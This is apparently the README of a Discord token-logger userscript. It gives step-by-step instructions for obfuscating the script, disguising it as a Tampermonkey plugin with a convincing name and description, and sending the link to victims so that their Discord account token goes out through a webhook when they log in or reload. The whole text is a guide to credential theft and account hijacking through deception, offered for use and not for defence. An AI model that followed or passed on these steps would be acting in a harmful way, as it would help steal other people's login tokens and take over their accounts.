# token-logger
a really lame token logger for discord lol

# how does it work / how can i use it
1. after changing the code to how you want it, obfuscate it using [this website](https://obfuscator.io)
2. copy the code you got, then make a github repo with whatever name, and add a file called `yourpluginname.user.js`
3. **make the plugin name and description convincing!**
4. copy the raw file link, and send it to someone with tampermonkey lol
5. now when reload discord or login to an account it'll send the token via a webhook!
   - if their token doesn't change, it will not resend the token (this is to prevent them from spamming the webhook by constantly reloading the page or constantly opening discord)

> some acknowledgements i should have added: **this includes code from** [this script](https://greasyfork.org/en/scripts/395741-get-discord-token)

why, you may ask? well if the code already exists, why rewrite it when i can borrow it. (thanks brendan)
